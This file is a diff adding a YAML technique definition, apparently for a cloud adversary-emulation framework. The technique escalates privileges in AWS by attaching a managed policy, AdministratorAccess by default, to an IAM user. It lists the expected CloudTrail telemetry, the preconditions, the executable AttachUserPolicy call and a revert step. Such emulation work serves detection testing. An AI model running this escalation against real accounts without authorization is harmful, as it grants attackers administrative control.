@@ -1,0 +1,45 @@
+metadata:
+  id: aws.iam.privesc.attach-user-policy
+  name: Attach Managed Policy to User
+  description: >-
+    Attach a highly-privileged managed policy (e.g. AdministratorAccess) to a
+    controlled IAM user to escalate privileges.
+  author: Akumo
+  version: "1.0.0"
+  provider: aws
+  mitre: ["T1098"]
+  references:
+    - "https://aws-samples.github.io/threat-technique-catalog-for-aws/matrix.html"
+  impact: mutating-reversible
+  expected_telemetry:
+    - source: cloudtrail
+      event_name: AttachUserPolicy
+      fields:
+        eventSource: iam.amazonaws.com
+
+contract:
+  inputs:
+    - name: user
+      type: principal
+      required: true
+    - name: policy_arn
+      type: string
+      required: true
+      default: "arn:aws:iam::aws:policy/AdministratorAccess"
+  preconditions:
+    - predicate: { name: has_permission, args: ["$foothold", "iam:AttachUserPolicy"] }
+      min_status: proven
+  effects:
+    - predicate: { name: has_permission, args: ["$user", "$policy_arn"] }
+
+steps:
+  - id: attach-policy
+    body:
+      type: call
+      service: iam
+      operation: AttachUserPolicy
+      params: { UserName: "$user", PolicyArn: "$policy_arn" }
+    revert:
+      service: iam
+      operation: DetachUserPolicy
+      params: { UserName: "$user", PolicyArn: "$policy_arn" }
